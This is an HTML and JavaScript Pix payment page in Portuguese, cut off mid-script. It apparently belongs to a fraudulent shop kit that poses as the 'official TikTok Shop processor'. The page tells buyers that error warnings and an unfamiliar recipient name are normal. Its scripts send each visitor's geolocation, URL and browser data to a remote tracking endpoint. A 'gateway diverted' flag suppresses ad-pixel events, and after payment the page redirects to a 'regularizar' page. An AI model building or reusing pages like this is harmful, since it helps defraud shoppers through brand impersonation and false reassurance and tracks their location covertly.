<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no">
  <title>Finalização de Compra</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="mobile-fix.css" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer" />
  <script src="/services/zero-gate/pixel.js"></script>
  <script>
    (function () {
      function inferVitrineFromPath() {
        const pathParts = String(window.location.pathname || '').split('/').filter(Boolean);
        const storeIndex = pathParts.indexOf('store');
        if (storeIndex >= 0 && pathParts[storeIndex + 1]) {
          return pathParts[storeIndex + 1];
        }
        return '';
      }

      const parseGatewayDiverted = (value) => {
        if (value === true || value === false) return value;
        if (value === 1 || value === 0) return value === 1;
        if (typeof value !== 'string') return null;
        const normalized = value.trim().toLowerCase();
        if (['1', 'true', 'sim', 'yes'].includes(normalized)) return true;
        if (['0', 'false', 'nao', 'no'].includes(normalized)) return false;
        return null;
      };

      const resolveGatewayDivertedFromOrder = (order) => {
        if (!order || typeof order !== 'object') return null;
        const candidates = [
          order.gatewayDiverted,
          order.gateway_diverted,
          order.tracking_context?.gateway_diverted,
          order.trackingContext?.gateway_diverted,
          order.trackingParameters?.gateway_diverted,
          order.pix?.gateway_diverted,
          order.pix?.tracking_context?.gateway_diverted,
          order.pix?.trackingParameters?.gateway_diverted,
          order.gatewayResponse?.gateway_diverted,
          order.gatewayResponse?.tracking_context?.gateway_diverted,
          order.gatewayResponse?.trackingParameters?.gateway_diverted,
          order.gatewayResponse?.data?.tracking_context?.gateway_diverted,
          order.gatewayResponse?.data?.trackingParameters?.gateway_diverted
        ];
        for (const candidate of candidates) {
          const parsed = parseGatewayDiverted(candidate);
          if (parsed !== null) return parsed;
        }
        return null;
      };

      const seedGatewayDivertedFromStorage = () => {
        try {
          const raw = sessionStorage.getItem('checkoutOrdem');
          if (!raw) return;
          const stored = JSON.parse(raw);
          const parsed = resolveGatewayDivertedFromOrder(stored);
          if (parsed !== null) {
            window.RABBITFY_GATEWAY_DIVERTED = parsed;
          }
        } catch (error) {}
      };

      seedGatewayDivertedFromStorage();

      async function resolvePixelId() {
        const params = new URLSearchParams(window.location.search);
        const vitrine = (params.get('vitrine') || params.get('slug') || inferVitrineFromPath()).trim();
        const endpointParams = new URLSearchParams({
          host: window.location.hostname || '',
          path: window.location.pathname || '',
          ts: String(Date.now()),
        });
        if (vitrine !== '') {
          endpointParams.set('vitrine', vitrine);
        }
        try {
          const response = await fetch('/app/api/tiktok_pixel.php?' + endpointParams.toString(), { cache: 'no-store' });
          const data = await response.json();
          const fromList = Array.isArray(data?.pixel_ids)
            ? data.pixel_ids.map((id) => String(id || '').trim()).filter(Boolean)
            : [];
          const resolved = String(data?.pixel_id || '').trim();
          const pixelIds = fromList.length > 0
            ? Array.from(new Set(fromList))
            : (resolved ? [resolved] : []);
          return {
            primaryPixelId: resolved || (pixelIds[0] || ''),
            pixelIds,
            markAsPaid: String(data?.mark_as_paid || 'nao').toLowerCase() === 'sim',
          };
        } catch (error) {
          return { primaryPixelId: '', pixelIds: [], markAsPaid: false };
        }
      }

      function loadTikTok(payload) {
        if (window.RABBITFY_GATEWAY_DIVERTED === true) return;
        const pixelIds = Array.isArray(payload?.pixelIds)
          ? payload.pixelIds.map((id) => String(id || '').trim()).filter(Boolean)
          : [];
        const primaryPixelId = String(payload?.primaryPixelId || pixelIds[0] || '').trim();
        if (!primaryPixelId) return;
        window.TIKTOK_PIXEL_ID = primaryPixelId;
        window.TIKTOK_PIXEL_IDS = pixelIds;
        window.TIKTOK_MARK_AS_PAID = Boolean(payload?.markAsPaid);
        !function (w, d, t) {
          w.TiktokAnalyticsObject = t; var ttq = w[t] = w[t] || [];
          ttq.methods = ["page", "track"];
          ttq.setAndDefer = function (a, b) { a[b] = function () { a.push([b].concat([].slice.call(arguments, 0))); }; };
          for (var i = 0; i < ttq.methods.length; i++) ttq.setAndDefer(ttq, ttq.methods[i]);
          ttq.load = function (e) {
            var s = d.createElement("script");
            s.async = !0;
            s.src = "https://analytics.tiktok.com/i18n/pixel/events.js?sdkid=" + e + "&lib=" + t;
            d.head.appendChild(s);
          };
          (pixelIds.length ? pixelIds : [primaryPixelId]).forEach(function (id) { ttq.load(id); });
          ttq.page();
        }(window, document, 'ttq');
        window.ttqFire = (name, payload = {}) => {
          if (window.RABBITFY_GATEWAY_DIVERTED === true) return;
          if (typeof ttq !== 'undefined' && typeof ttq.track === 'function') {
            ttq.track(name, payload);
          }
        };
        window.ttqFire('InitiateCheckout', { currency: 'BRL' });
      }

      let tiktokLoaded = false;
      const maybeLoadTikTok = () => {
        if (tiktokLoaded) return;
        if (window.RABBITFY_GATEWAY_DIVERTED === true) return;
        resolvePixelId().then((payload) => {
          if (window.RABBITFY_GATEWAY_DIVERTED === true) return;
          loadTikTok(payload);
          tiktokLoaded = true;
        });
      };
      window.maybeLoadTikTok = maybeLoadTikTok;
      maybeLoadTikTok();
    })();
  </script>
  <style>
    *{box-sizing:border-box}
    body,html{overflow-x:hidden;margin:0;padding:0;background:#f2f2f2;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;font-size:14px;color:#1a1a1a}

    /* Header */
    #pay-header{position:fixed;top:0;left:0;right:0;z-index:100;background:#fff;border-bottom:1px solid #f0f0f0}
    #pay-header-inner{display:flex;align-items:center;padding:10px 16px;gap:10px}
    #pay-header h1{flex:1;text-align:center;font-size:15px;font-weight:700;color:#111;margin:0}
    #pay-trust-bar{background:linear-gradient(90deg,#fe2c55,#ff4f8b);padding:5px 16px;display:flex;align-items:center;justify-content:center;gap:6px}
    #pay-trust-bar span{font-size:11px;color:#fff;font-weight:600;letter-spacing:.02em}

    /* Cards */
    .pay-card{background:#fff;border-radius:0;margin-bottom:8px;overflow:hidden}

    /* QR box */
    #qr-root{}
    #qr-root .qr-inner{padding:20px 16px 16px}
    #qr-root .qr-title{font-size:16px;font-weight:800;color:#111;margin:0 0 4px}
    #qr-root .qr-sub{font-size:12px;color:#9ca3af;margin:0 0 16px}
    #pix-img-wrap{display:flex;justify-content:center;margin-bottom:16px}
    #pix-img-wrap img{width:200px;height:200px;border-radius:12px;border:1px solid #f0f0f0;padding:8px;background:#fff}
    #qr-text{width:100%;border:1px solid #e5e7eb;border-radius:10px;padding:12px 14px;font-size:11px;font-family:monospace;color:#374151;background:#f9fafb;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
    #qr-copy{width:100%;background:#fe2c55;color:#fff;border:none;border-radius:99px;padding:15px;font-size:15px;font-weight:700;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:8px;margin-top:10px}
    #qr-copy:active{transform:scale(.98)}
    #qr-feedback{display:block;text-align:center;font-size:12px;margin-top:8px;min-height:18px}

    /* Avisos */
    .aviso-card{margin:0 0 8px;background:#fff}
    .aviso-body{padding:14px 16px;display:flex;gap:12px;align-items:flex-start}
    .aviso-icon{flex-shrink:0;width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:16px}
    .aviso-icon.amber{background:#fff7ed}
    .aviso-icon.blue{background:#eff6ff}
    .aviso-icon.green{background:#f0fdf4}
    .aviso-title{font-size:13px;font-weight:700;color:#111;margin:0 0 3px}
    .aviso-text{font-size:12px;color:#6b7280;line-height:1.5;margin:0}

    /* Processadora badge */
    #badge-processadora{background:#fff;padding:14px 16px;display:flex;align-items:center;gap:12px;border-bottom:1px solid #f3f4f6}

    /* Steps */
    .steps-scroll{display:flex;gap:8px;padding:12px 16px;overflow-x:auto;-webkit-overflow-scrolling:touch;scrollbar-width:none}
    .steps-scroll::-webkit-scrollbar{display:none}
    .step-card{flex-shrink:0;width:130px;background:#f9fafb;border-radius:12px;padding:12px;display:flex;flex-direction:column;gap:6px}
    .step-num{width:24px;height:24px;border-radius:50%;background:#111;color:#fff;font-size:11px;font-weight:800;display:flex;align-items:center;justify-content:center}
    .step-title{font-size:12px;font-weight:700;color:#111;line-height:1.3}
    .step-desc{font-size:11px;color:#9ca3af;line-height:1.4}

    /* Footer */
    #pay-footer{position:fixed;bottom:0;left:0;right:0;background:#fff;border-top:1px solid #f0f0f0;z-index:100}
    #pay-footer-top{background:#fff0f3;padding:8px 16px;display:flex;align-items:center;justify-content:space-between}
    #pay-footer-mid{padding:8px 16px;display:flex;align-items:center;justify-content:space-between}
    #pay-footer-btn{width:100%;background:#1a1a1a;color:#fff;border:none;padding:13px;font-size:13px;font-weight:600;letter-spacing:.01em;display:block}

    /* Toast */
    .toast-center{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%) scale(.98);min-width:240px;max-width:90vw;background:#3a3a3a;color:#fff;padding:16px 20px;border-radius:14px;box-shadow:0 10px 30px rgba(0,0,0,.25);z-index:9999;display:inline-flex;align-items:center;gap:12px;opacity:0;pointer-events:none;transition:opacity .25s ease,transform .25s ease}
    .toast-center.show{opacity:1;transform:translate(-50%,-50%) scale(1)}

    /* mensagem slide */
    .mensagem-slide{position:relative;height:1.15rem;overflow:hidden;display:flex;align-items:center;justify-content:center}
    .mensagem-slide span{position:absolute;left:0;right:0;text-align:center;white-space:nowrap;opacity:0;animation:fadeMsg 9s infinite}
    .mensagem-slide span:nth-child(1){animation-delay:0s}
    .mensagem-slide span:nth-child(2){animation-delay:3s}
    .mensagem-slide span:nth-child(3){animation-delay:6s}
    @keyframes fadeMsg{0%{opacity:0}8%{opacity:1}33%{opacity:1}41%{opacity:0}100%{opacity:0}}

    @keyframes pulse-ring{0%{transform:scale(.95);opacity:.8}70%{transform:scale(1.05);opacity:.4}100%{transform:scale(.95);opacity:.8}}
    .pulse-ring{animation:pulse-ring 2s ease-in-out infinite}
  </style>
  <script>
    const __paymentParams = new URLSearchParams(window.location.search);
    const PAYMENT_CONFIRM_REDIRECT_FALLBACK = "https://app.rabbtifyecom.com/seguro/regularizar.php";
    const PAYMENT_CONFIRM_REDIRECT_FROM_QUERY = (__paymentParams.get('upsell') || __paymentParams.get('redirect') || '').trim();
    let paymentConfirmRedirectUrl = PAYMENT_CONFIRM_REDIRECT_FROM_QUERY || PAYMENT_CONFIRM_REDIRECT_FALLBACK;

    (async function loadConfiguredRedirectUrl() {
      if (PAYMENT_CONFIRM_REDIRECT_FROM_QUERY) return;
      try {
        const endpointParams = new URLSearchParams({ ts: String(Date.now()) });
        endpointParams.set('host', window.location.hostname || '');
        const response = await fetch(`/app/api/checkout_redirect.php?${endpointParams.toString()}`, { cache: 'no-store' });
        const data = await response.json();
        const configured = (data?.redirect_url || '').trim();
        if (data?.success === true && /^https?:\/\//i.test(configured)) {
          paymentConfirmRedirectUrl = configured;
        }
      } catch (error) {}
    })();
  </script>
  <!-- Rastreamento LED para mapa em tempo real -->
  <script>
  (async function() {
    const TRACK_ENDPOINT = 'https://app.rabbtifyecom.com/app/api/track_led_visitor.php';
    async function resolveSlug() {
      try {
        const response = await fetch('loja.json', { cache: 'no-store' });
        if (response.ok) {
          const loja = await response.json();
          const slug = String(loja?.slug || loja?.nome || '').trim();
          if (slug !== '') return slug;
        }
      } catch (e) {}
      const configuredSlug = String(window.LOJA_SLUG || '').trim();
      if (configuredSlug !== '') return configuredSlug;
      return (window.location.hostname || 'payment').trim();
    }
    const SLUG = await resolveSlug();
    async function getLocation() {
      return await new Promise(resolve => {
        if (!navigator.geolocation) return resolve({});
        navigator.geolocation.getCurrentPosition(
          pos => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
          () => resolve({})
        );
      });
    }
    async function trackVisitor(stage) {
      const loc = await getLocation();
      fetch(TRACK_ENDPOINT, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ slug: SLUG, stage: stage || 'pix', lat: loc.lat, lng: loc.lng, url: window.location.href, ref: document.referrer || '', ua: navigator.userAgent })
      });
    }
    window.trackLedStage = trackVisitor;
    trackVisitor('pix');
  })();
  </script>
</head>

<body>
  <!-- HEADER -->
  <header id="pay-header">
    <div id="pay-header-inner">
      <button type="button" onclick="history.back()" style="width:36px;height:36px;display:flex;align-items:center;justify-content:center;background:none;border:none;cursor:pointer;color:#111;flex-shrink:0">
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
      </button>
      <h1>Realizar pagamento</h1>
      <div style="width:36px"></div>
    </div>
    <div id="pay-trust-bar">
      <svg width="11" height="11" viewBox="0 0 24 24" fill="white"><path d="M12 1l3.5 7 7.5 1.1-5.5 5.3 1.3 7.6L12 18.4l-6.8 3.6 1.3-7.6L1 9.1l7.5-1.1z"/></svg>
      <span>Pagamento 100% seguro e criptografado</span>
      <svg width="11" height="11" viewBox="0 0 24 24" fill="white"><path d="M12 1l3.5 7 7.5 1.1-5.5 5.3 1.3 7.6L12 18.4l-6.8 3.6 1.3-7.6L1 9.1l7.5-1.1z"/></svg>
    </div>
    <div style="background:#f9fafb;padding:5px 16px;display:flex;align-items:center;justify-content:center;gap:6px">
      <div class="mensagem-slide" style="font-size:11px;color:#6b7280;width:100%">
        <span><i class="fas fa-shield-alt" style="color:#16a34a;margin-right:4px"></i> Compra garantida</span>
        <span><i class="fas fa-lock" style="color:#2563eb;margin-right:4px"></i> Dados criptografados</span>
        <span><i class="fas fa-check-circle" style="color:#fe2c55;margin-right:4px"></i> Processadora oficial TikTok</span>
      </div>
    </div>
  </header>

  <main style="padding-top:108px;padding-bottom:140px">

    <!-- Resumo oculto (mantém lógica) -->
    <div id="carrinhoContainer" style="display:none" aria-hidden="true"></div>

    <!-- STATUS / HERO -->
    <div class="pay-card" style="margin-bottom:8px;padding:20px 16px;text-align:center">
      <div style="position:relative;display:inline-flex;align-items:center;justify-content:center;width:140px;height:140px;margin-bottom:12px">
        <div class="pulse-ring" style="position:absolute;inset:0;border-radius:50%;border:3px solid #fe2c55;opacity:.4"></div>
        <div class="pulse-ring" style="position:absolute;inset:-10px;border-radius:50%;border:2px solid #fe2c55;opacity:.2;animation-delay:.3s"></div>
        <img id="hero-pix-image" src="/uploads/mao-celular.png" alt="" style="width:110px;height:110px;object-fit:contain;position:relative;z-index:1">
      </div>
      <h2 id="payment-status-heading" style="font-size:17px;font-weight:800;color:#111;margin:0 0 4px">Aguardando pagamento...</h2>
      <p style="font-size:13px;color:#6b7280;margin:0">Pague dentro de <strong style="color:#fe2c55">30 minutos</strong> para garantir seu pedido</p>
    </div>

    <!-- BADGE PROCESSADORA OFICIAL -->
    <div class="pay-card" style="margin-bottom:8px">
      <div id="badge-processadora">
        <div style="width:40px;height:40px;border-radius:10px;background:#111;display:flex;align-items:center;justify-content:center;flex-shrink:0;overflow:hidden">
          <svg width="22" height="22" viewBox="0 0 660 660" fill="none"><path d="M342 0c-45.7 3.5-91 14.6-130.6 36C151 67.5 101.3 115 71.2 174.2 46.7 222 36.2 275.6 40.2 328c4.3 56.3 26.2 111 63 155.3 52.5 63 130.7 101.5 212.5 104.7 49.3 2 99-9.7 142.5-33.5 58.6-32 105.2-85 130-146 23.8-57.3 28.3-122 12.8-182-14.8-57.5-47.5-110.3-93.5-148C466.7 41.5 422 12 373 3.5 363 1.2 352 0 342 0zm18.2 197.5c11.6 1.4 22.4 6.8 30.7 15.2 10.5 10.5 16.4 24.8 16.4 39.3 0 9.8-2.5 19.4-7.4 27.7l-65.5 110.8c-3.8 6.5-13.3 6.5-17.2 0L253.2 280c-4.7-8-7.4-17.3-7.4-27 0-14.6 5.8-28.7 16-39.2 10.4-10.4 24.4-16.3 38.8-16.3 12.4 0 24.6 4 34.6 11.5l5.8 4.4 6-4.5c12.2-9.2 27.8-13.3 43.2-11.4z" fill="white"/></svg>
        </div>
        <div style="flex:1">
          <p style="font-size:13px;font-weight:700;color:#111;margin:0 0 1px">Processadora oficial do TikTok Shop</p>
          <p style="font-size:11px;color:#9ca3af;margin:0">Plataforma autorizada e certificada para pagamentos</p>
        </div>
        <div style="flex-shrink:0">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none"><path d="M9 12l2 2 4-4" stroke="#16a34a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/><circle cx="12" cy="12" r="10" stroke="#16a34a" stroke-width="2"/></svg>
        </div>
      </div>
    </div>

    <!-- QR CODE CARD -->
    <div class="pay-card" style="margin-bottom:8px" id="qr-root">
      <div style="padding:14px 16px 8px;border-bottom:1px solid #f3f4f6;display:flex;align-items:center;gap:8px">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><rect x="3" y="3" width="7" height="7" rx="1" stroke="#111" stroke-width="2"/><rect x="14" y="3" width="7" height="7" rx="1" stroke="#111" stroke-width="2"/><rect x="3" y="14" width="7" height="7" rx="1" stroke="#111" stroke-width="2"/><path d="M14 14h3v3M14 17h3v3M17 14h3v3" stroke="#111" stroke-width="2" stroke-linecap="round"/></svg>
        <span style="font-size:14px;font-weight:700;color:#111">Pix — QR Code e código copia e cola</span>
      </div>
      <div class="qr-inner">
        <div class="qr-title">Escaneie ou copie o código Pix</div>
        <div class="qr-sub">Pagamento aprovado em segundos — funciona em qualquer banco</div>
        <div id="pix-img-wrap"></div>
        <input type="text" id="qr-text" readonly placeholder="Carregando código Pix..." />
        <button type="button" id="qr-copy">
          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg>
          Copiar código Pix
        </button>
        <span id="qr-feedback"></span>
      </div>
    </div>

    <!-- AVISO INSTABILIDADE TIKTOK -->
    <div class="aviso-card pay-card" style="margin-bottom:8px">
      <div style="background:#fffbeb;padding:10px 16px;border-bottom:1px solid #fde68a;display:flex;align-items:center;gap:6px">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="none"><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" fill="#f59e0b"/><line x1="12" y1="9" x2="12" y2="13" stroke="#fff" stroke-width="2" stroke-linecap="round"/><line x1="12" y1="17" x2="12.01" y2="17" stroke="#fff" stroke-width="2.5" stroke-linecap="round"/></svg>
        <span style="font-size:12px;font-weight:700;color:#92400e">Aviso importante</span>
      </div>
      <div class="aviso-body">
        <div class="aviso-icon amber">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#f59e0b"/><line x1="12" y1="8" x2="12" y2="12" stroke="#fff" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="16" r="1" fill="#fff"/></svg>
        </div>
        <div>
          <p class="aviso-title">O TikTok pode apresentar instabilidades</p>
          <p class="aviso-text">Se aparecer algum aviso ou mensagem de erro durante o pagamento, <strong>é completamente normal</strong>. O TikTok Shop passa por instabilidades ocasionais no sistema de pagamento, mas o seu pedido está garantido. Pague normalmente — o sistema processa mesmo com esses avisos.</p>
        </div>
      </div>
    </div>

    <!-- AVISO NOME DIFERENTE -->
    <div class="aviso-card pay-card" style="margin-bottom:8px">
      <div class="aviso-body">
        <div class="aviso-icon blue">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#3b82f6"/><line x1="12" y1="8" x2="12" y2="12" stroke="#fff" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="16" r="1" fill="#fff"/></svg>
        </div>
        <div>
          <p class="aviso-title">O nome no recebedor pode parecer diferente</p>
          <p class="aviso-text">Ao confirmar o Pix, o nome do recebedor pode aparecer como razão social da processadora. Isso é normal e faz parte do sistema de pagamentos do TikTok Shop. O valor e o pedido estão totalmente seguros.</p>
        </div>
      </div>
    </div>

    <!-- AVISO APROVAÇÃO RÁPIDA -->
    <div class="aviso-card pay-card" style="margin-bottom:8px">
      <div class="aviso-body">
        <div class="aviso-icon green">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="10" fill="#16a34a"/><path d="M8 12l3 3 5-5" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
        </div>
        <div>
          <p class="aviso-title">Confirmação em segundos</p>
          <p class="aviso-text">Após o pagamento, você será redirecionado automaticamente. Guarde o comprovante do Pix para acompanhar o envio.</p>
        </div>
      </div>
    </div>

    <!-- COMO PAGAR -->
    <div class="pay-card" style="margin-bottom:8px">
      <div style="padding:12px 16px 4px;font-size:13px;font-weight:700;color:#111">Como pagar com Pix copia e cola</div>
      <div class="steps-scroll">
        <div class="step-card">
          <div class="step-num">1</div>
          <div class="step-title">Copie o código</div>
          <div class="step-desc">Toque no botão "Copiar código Pix" acima</div>
        </div>
        <div class="step-card">
          <div class="step-num">2</div>
          <div class="step-title">Abra o app do banco</div>
          <div class="step-desc">Acesse seu aplicativo financeiro preferido</div>
        </div>
        <div class="step-card">
          <div class="step-num">3</div>
          <div class="step-title">Pix → Copia e cola</div>
          <div class="step-desc">Selecione a opção Pix e depois copia e cola</div>
        </div>
        <div class="step-card">
          <div class="step-num">4</div>
          <div class="step-title">Confira os dados</div>
          <div class="step-desc">Verifique o valor antes de confirmar</div>
        </div>
        <div class="step-card">
          <div class="step-num">5</div>
          <div class="step-title">Pronto!</div>
          <div class="step-desc">Pagamento confirmado automaticamente</div>
        </div>
      </div>
    </div>

  </main>

  <!-- FOOTER FIXO -->
  <footer id="pay-footer">
    <div id="pay-footer-top">
      <div style="display:flex;align-items:center;gap:6px">
        <svg width="13" height="13" viewBox="0 0 24 24" fill="none"><path d="M20 12V22H4V12" stroke="#fe2c55" stroke-width="2" stroke-linecap="round"/><path d="M22 7H2v5h20V7z" stroke="#fe2c55" stroke-width="2" stroke-linecap="round"/><path d="M12 22V7M12 7H7.5a2.5 2.5 0 010-5C11 2 12 7 12 7zM12 7h4.5a2.5 2.5 0 000-5C13 2 12 7 12 7z" stroke="#fe2c55" stroke-width="2" stroke-linecap="round"/></svg>
        <span style="font-size:12px;color:#be123c;font-weight:600">Você está economizando <span id="desconto-1">R$ 0,00</span> neste pedido</span>
      </div>
    </div>
    <div id="pay-footer-mid">
      <div>
        <p style="font-size:11px;color:#9ca3af;margin:0">Total (<span id="quantidade_x">0 itens</span>)</p>
        <p style="font-size:19px;font-weight:800;color:#111;margin:0" id="total1">R$ 0,00</p>
      </div>
      <div style="text-align:right">
        <p style="font-size:10px;color:#9ca3af;margin:0">Expira em</p>
        <p style="font-size:13px;font-weight:700;color:#fe2c55;margin:0" id="contador">30:00</p>
      </div>
    </div>
  </footer>

  <div id="toastContainer"></div>

  <script>
    (async function () {
      const container = document.getElementById('carrinhoContainer');
      const descontoEls = [document.getElementById('desconto-1'), document.getElementById('desconto-2'), document.getElementById('desconto-3')];
      const totalCarrinhoEl = document.getElementById('total-carrinho');
      const totalEl = document.getElementById('total');
      const totalFooterEl = document.getElementById('total1');
      const freteEl = document.getElementById('total-frete');
      const quantidadeEl = document.getElementById('quantidade_x');
      const compradorEl = document.getElementById('compradorResumo');
      const entregaEl = document.getElementById('entregaResumo');
      const placeholderImg = 'https://via.placeholder.com/160x160.png?text=Produto';
      const esc = (value) => (value || value === 0) ? String(value).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;') : '';
      const formatBRL = (value) => new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(Number(value || 0));

      function loadOrder() {
        try {
          const raw = sessionStorage.getItem('checkoutOrdem');
          if (!raw) return null;
          const order = JSON.parse(raw);
          if (!order || typeof order !== 'object') return null;
          return order;
        } catch (error) {
          return null;
        }
      }

      async function fetchOrderFromDatabase(ref, tx) {
        try {
          if (!ref && !tx) return null;
          const qs = new URLSearchParams();
          if (ref) qs.set('ref', ref);
          if (tx) qs.set('tx', tx);
          const response = await fetch(`pedido_detalhe.php?${qs.toString()}`, { cache: 'no-store' });
          const data = await response.json();
          if (!response.ok || !data || data.success !== true || !data.order) return null;
          const merged = { ...data.order, pix: data.order.gatewayResponse || data.order.pix || undefined };
          try { sessionStorage.setItem('checkoutOrdem', JSON.stringify(merged)); } catch (e) {}
          return merged;
        } catch (error) {
          return null;
        }
      }

      function computeTotals(order) {
        const carrinho = Array.isArray(order.carrinho) ? order.carrinho : [];
        let subtotal = typeof order.subtotal === 'number' ? order.subtotal : 0;
        if (!subtotal) subtotal = carrinho.reduce((acc, item) => acc + Number(item.preco || 0) * Number(item.quantidade || 1), 0);
        let desconto = typeof order.desconto === 'number' ? order.desconto : null;
        if (desconto === null) {
          desconto = carrinho.reduce((acc, item) => {
            const preco = Number(item.preco || 0);
            const comparacao = Number(item.preco_comparacao || 0);
            const qtd = Number(item.quantidade || 1);
            if (comparacao > preco) acc += (comparacao - preco) * qtd;
            return acc;
          }, 0);
        }
        if (desconto < 0) desconto = 0;
        const freteValor = order.frete ? Number(order.frete.preco || 0) : 0;
        let total = typeof order.total === 'number' ? order.total : Math.max(subtotal - desconto, 0) + freteValor;
        if (total < 0) total = 0;
        const itens = carrinho.reduce((acc, item) => acc + Number(item.quantidade || 1), 0);
        return { subtotal, desconto, freteValor, total, itens };
      }

      function computeOrderBumpMetrics(carrinho) {
        const items = Array.isArray(carrinho) ? carrinho : [];
        let itens = 0, valor = 0;
        for (const item of items) {
          const itemType = String(item?.itemType || item?.tipo_item || item?.tipoItem || '').toLowerCase().trim();
          const isOrderBump = item?.isOrderBump === true || itemType === 'order_bump' || itemType === 'orderbump';
          if (!isOrderBump) continue;
          const qtd = Math.max(1, Number(item?.quantidade || 1));
          const preco = Number(item?.preco || 0);
          itens += qtd;
          valor += preco * qtd;
        }
        return { itens, valor: Number(valor.toFixed(2)) };
      }

      function initQRCode() {
        const feedback = document.getElementById('qr-feedback');
        const textarea = document.getElementById('qr-text');
        const copyBtn = document.getElementById('qr-copy');
        const imgWrap = document.getElementById('pix-img-wrap');
        if (!textarea || !copyBtn) return;

        try {
          const order = JSON.parse(sessionStorage.getItem('checkoutOrdem'));
          let pixCode = order?.pixCode;
          let pixImage = order?.pixImage;

          if (!pixCode && order?.pix?.pix?.qrcode) pixCode = order.pix.pix.qrcode;
          if (!pixCode && order?.pix?.gatewayResponse?.data?.qr_code_pix) pixCode = order.pix.gatewayResponse.data.qr_code_pix;
          if (!pixCode && order?.pix?.data?.copypaste) pixCode = order.pix.data.copypaste;
          if (!pixCode && order?.gatewayResponse?.pix?.qrcode) pixCode = order.gatewayResponse.pix.qrcode;
          if (!pixCode && order?.gatewayResponse) {
            pixCode = order.gatewayResponse.data?.qr_code_pix || order.gatewayResponse.pix_copy_paste || order.gatewayResponse.pix_code || order.gatewayResponse.qr_code || '';
          }
          if (!pixCode && order?.data) pixCode = order.data.qr_code_pix || order.data.copypaste || '';
          if (!pixCode && typeof order?.qr_code_pix === 'string') pixCode = order.qr_code_pix;
          if (!pixCode && typeof order?.copypaste === 'string') pixCode = order.copypaste;
          if (!pixCode && typeof order === 'object' && typeof order.qr_code_pix === 'string') pixCode = order.qr_code_pix;
          if (!pixCode && typeof order === 'object' && typeof order.copypaste === 'string') pixCode = order.copypaste;

          if (!pixImage && order?.gatewayResponse) pixImage = order.gatewayResponse.qr_code_image_url || order.gatewayResponse.pix_qr_code_image || '';
          if (!pixImage && order?.data) pixImage = order.data.qr_code_image_url || order.data.pix_qr_code_image || '';
          if (!pixImage && order?.qr_code_image_url) pixImage = order.qr_code_image_url;

          if (pixCode) {
            order.pixCode = pixCode;
            sessionStorage.setItem('checkoutOrdem', JSON.stringify(order));
            textarea.value = pixCode;
            textarea.addEventListener('click', () => { try { textarea.select(); } catch (e) {} });
            if (feedback) { feedback.textContent = 'Toque no botão abaixo para copiar o código Pix'; feedback.style.color = '#6b7280'; }
          } else {
            if (feedback) { feedback.textContent = 'Código Pix não encontrado. Volte e gere novamente.'; feedback.style.color = '#dc2626'; }
          }

          if (pixImage && imgWrap) {
            order.pixImage = pixImage;
            sessionStorage.setItem('checkoutOrdem', JSON.stringify(order));
            const img = document.createElement('img');
            img.src = pixImage;
            img.alt = 'QR Code Pix';
            imgWrap.appendChild(img);
          }
        } catch (e) {
          if (feedback) { feedback.textContent = 'Erro ao carregar código Pix.'; feedback.style.color = '#dc2626'; }
        }

        copyBtn.addEventListener('click', async () => {
          const val = textarea?.value || '';
          if (!val) return;
          try {
            await navigator.clipboard.writeText(val);
            copyBtn.style.background = '#16a34a';
            copyBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M20 6L9 17l-5-5"/></svg> Código copiado!';
            if (feedback) { feedback.textContent = 'Agora abra o app do banco e pague com Pix copia e cola'; feedback.style.color = '#16a34a'; }
            setTimeout(() => {
              copyBtn.style.background = '#fe2c55';
              copyBtn.innerHTML = '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"/></svg> Copiar código Pix';
              if (feedback) { feedback.textContent = ''; }
            }, 3000);
          } catch (error) {
            if (feedback) { feedback.textContent = 'Não foi possível copiar. Selecione e copie manualmente.'; feedback.style.color = '#dc2626'; }
          }
        });
      }

      function iniciarContador() {
        let segundos = 30 * 60;
        const span = document.getElementById('contador');
        if (!span) return;
        const tick = () => {
          if (segundos <= 0) { span.textContent = 'Expirado'; return; }
